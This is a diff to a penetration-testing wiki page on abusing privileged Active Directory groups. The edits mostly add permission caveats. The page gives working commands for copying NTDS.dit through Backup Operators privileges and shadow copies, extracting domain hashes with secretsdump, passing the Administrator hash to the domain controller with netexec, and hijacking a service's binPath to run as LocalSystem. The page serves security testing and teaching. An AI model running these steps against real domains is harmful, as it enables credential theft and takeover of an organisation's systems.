@@ -20,6 +20,8 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 
 Adding new users is permitted, as well as local login to the DC.<sup>[[1]](#references)</sup>
 
+A conditional path from account management to local administrator access is an **ordinary group delegated to read a computer's LAPS password**. Check effective membership-write rights on that exact group, whether it is protected, and whether a new or controlled account can actually join it. Refresh the account's token before testing the target computer's LAPS read permission. For encrypted Windows LAPS, directory read permission and password-decryption authority are separate requirements; group membership or Account Operators membership alone does not establish either. See [Microsoft's Account Operators scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) and [Windows LAPS delegation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).
+
 ## AdminSDHolder group
 
 The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
@@ -48,13 +50,15 @@ For more details, visit [ired.team](https://ired.team/offensive-security-experim
 
 ## AD Recycle Bin
 
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
+Deleted-object visibility is controlled by effective directory permissions; a group name alone does not prove that the current identity can list or restore an object. AD Recycle Bin must have been enabled before the deletion for full restore, and a restore also requires Reanimate-Tombstones on the naming-context root, rename rights, and CREATE_CHILD on the destination container. [Microsoft's Recycle Bin guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) and [undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguish these conditions. An authorized identity with deleted-object read access can inspect records that may reveal sensitive information:
 
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
 This is useful for **recovering previous privilege paths**. Deleted objects can still expose `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, old SPNs, or the DN of a deleted privileged group that can later be restored by another operator.
+
+Application-defined attributes may also retain old credential material while an object remains in the deleted state. Treat this as a separate review lead: the current identity must be allowed to enumerate the deleted object **and** read that attribute, the value must be a usable credential, and a still-active principal must accept it. Group membership or a deleted account name alone proves none of those steps; avoid printing credential values during routine enumeration. [Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) describes attribute preservation after deletion.
 
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
@@ -78,7 +82,7 @@ This command reveals that `Server Operators` have full access, enabling the mani
 
 ## Backup Operators
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.<sup>[[1]](#references)</sup>
+Membership in `Backup Operators` can grant `SeBackupPrivilege` and `SeRestorePrivilege` on a host, depending on its local policy and the logon session. Check the **effective token of the process running the commands** with `whoami /groups` and `whoami /priv`: membership alone does not prove that `SeBackupPrivilege` is present and enabled. If the privilege is present but disabled, it may be enabled in that token; if it is absent or removed, these backup operations cannot use it. `SeBackupPrivilege` supports protected **reads** through backup-aware APIs (for example, `FILE_FLAG_BACKUP_SEMANTICS` or `robocopy /B`); `SeRestorePrivilege` is a separate privilege for restore/write operations. Ordinary directory listings and copies do not necessarily use backup semantics.<sup>[[1]](#references)</sup>
 
 To list group members, execute:
 
@@ -88,7 +92,7 @@ Get-NetGroupMember -Identity "Backup Operators" -Recurse
 
 ### Local Attack
 
-To leverage these privileges locally, the following steps are employed:
+On a host where the effective token has `SeBackupPrivilege`, the following backup-aware copy can read a protected file:
 
 1. Import necessary libraries:
 
@@ -97,14 +101,14 @@ Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
-2. Enable and verify `SeBackupPrivilege`:
+2. If the privilege is present but disabled, enable it and verify its state in this process:
 
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
 
-3. Access and copy files from restricted directories, for instance:
+3. Copy a file from a restricted directory, for instance:
 
 ```bash
 dir C:\Users\Administrator\
@@ -113,11 +117,11 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 
 ### AD Attack
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+`NTDS.dit` is the Active Directory database on a **domain controller (DC)**. This path requires a suitable token on the DC and access to the volume containing the database; Backup Operators membership elsewhere does not grant access to a particular DC. A live database is normally locked, so use an accessible shadow copy or another backup facility before copying it. Creating or exposing a shadow copy also depends on the host's VSS configuration and the caller's rights. The example below assumes the DC stores `NTDS.dit` on `C:` under `\Windows\NTDS`; adjust the volume and path if it does not.
 
 #### Using diskshadow.exe
 
-1. Create a shadow copy of the `C` drive:
+1. If permitted, create and expose a shadow copy of the DC's `C:` drive as `F:`:
 
 ```cmd
 diskshadow.exe
@@ -135,36 +139,36 @@ exit
 2. Copy `NTDS.dit` from the shadow copy:
 
 ```cmd
-Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+mkdir C:\Tools
+Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
 Alternatively, use `robocopy` for file copying:
 
 ```cmd
-robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
 ```
 
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
+3. Save the DC's `SYSTEM` hive for offline extraction. `SAM` is the local account database on member systems; a DC's `SAM` hive is not a substitute for `NTDS.dit` or a source of the domain Administrator hash:
 
 ```cmd
-reg save HKLM\SYSTEM SYSTEM.SAV
-reg save HKLM\SAM SAM.SAV
+reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
 ```
 
-4. Retrieve all hashes from `NTDS.dit`:
+4. Transfer `ntds.dit` and `SYSTEM.SAV` to the analysis host and extract domain account hashes. A saved `SAM` hive from a member system, with its matching `SYSTEM` hive, yields local account hashes instead:
 
 ```shell-session
-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
 ```
 
-5. Post-extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
+5. If a **domain** Administrator hash was recovered from `NTDS.dit`, it can be tested for domain authentication. A local Administrator hash from `SAM.SAV` is a different credential and does not authenticate as the domain Administrator.<sup>[[11]](#references)</sup>
 
 ```bash
-# Use the recovered Administrator NT hash to authenticate without the cleartext password
-netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
+# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
+netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
 
 # Or execute via SMB using an exec method
-netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
+netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
 ```
 
 #### Using wbadmin.exe
@@ -361,6 +365,8 @@ sc.exe \\dc01 query
 sc.exe \\dc01 qc <service>
 .\PsService.exe security <service>
 ```
+
+Failure to list services does not rule out access to a **known service**. The Service Control Manager checks `SC_MANAGER_ENUMERATE_SERVICE` for listing separately from `SC_MANAGER_CONNECT`; opening a named service checks its own rights, including `SERVICE_CHANGE_CONFIG` and `SERVICE_START`. Review the effective token and that service's ACL even when a general `sc.exe query` fails. Configuration rights alone are only a candidate: the service identity, start/stop rights, and a usable trigger still determine whether a higher-privilege transition is possible. See [Microsoft's service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
 
 If a service ACL gives this group change/start rights, point the service at an arbitrary command, start it as `LocalSystem`, and then restore the original `binPath`. If service control is locked down, fall back to the `Backup Operators` techniques above to copy `NTDS.dit`.
 
